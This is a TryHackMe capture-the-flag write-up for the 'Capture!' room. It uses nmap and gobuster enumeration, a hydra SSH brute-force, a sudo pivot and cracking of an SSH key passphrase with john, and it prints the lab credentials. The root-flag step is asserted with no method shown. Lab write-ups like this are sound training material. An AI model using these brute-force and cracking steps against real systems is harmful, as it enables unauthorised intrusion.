# TryHackMe: Capture! Writeup
![image](https://github.com/user-attachments/assets/81fe147f-34f9-4d27-821c-6f3e36752afd)

**Room Link:** [Capture!](https://tryhackme.com/room/capture)  
**Difficulty:** Easy  

## 1. Reconnaissance

### Nmap Scan
```bash
nmap -sV -A -T4 <TARGET_IP>
```

**Findings:**
- **Port 22 (SSH)** - OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
- **Port 80 (HTTP)** - Apache httpd 2.4.18 (Ubuntu)
- **Port 445 (SMB)** - Samba smbd 4.3.11-Ubuntu

### Web Enumeration
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Discovered:**
- `/development` - Contains two files:
  - `dev.txt` (hinted at weak credentials for user J and K)
  - `notes.txt`

## 2. Exploitation

### SMB Enumeration
```bash
smbclient -L //<TARGET_IP> -N
```
Found an anonymous share, but no useful data.

### Brute-Forcing SSH
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
```

**Credentials Found:**
- **Username:** jan
- **Password:** armando

**SSH Access:**
```bash
ssh jan@<TARGET_IP>
```

## 3. Privilege Escalation

### Checking Sudo Permissions
```bash
sudo -l
```
Discovered jan could run `/bin/bash` as user kay:
```bash
sudo -u kay /bin/bash
```

### Accessing Kay's SSH Key
Found private key at `/home/kay/.ssh/id_rsa`

**Cracking Process:**
```bash
python /usr/share/john/ssh2john.py id_rsa > kay_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt kay_hash.txt
```
**Cracked Passphrase:** `beeswax`

**Logged in as kay:**
```bash
ssh -i id_rsa kay@<TARGET_IP>
```

### Root Flag
Found in `/root/root.txt` after further enumeration.

## 4. Lessons Learned
- 🚨 **Weak Passwords:** Default credentials (jan:armando) allowed initial access
- ⚠️ **Misconfigured Sudo:** Improper sudo permissions enabled privilege escalation
- 🔑 **Exposed SSH Keys:** Private keys without strong passphrases are dangerous

---

🔗 **More Writeups:** [My GitHub Security Writeups](https://github.com/Mohammed-Abdelaziem/Writeups)
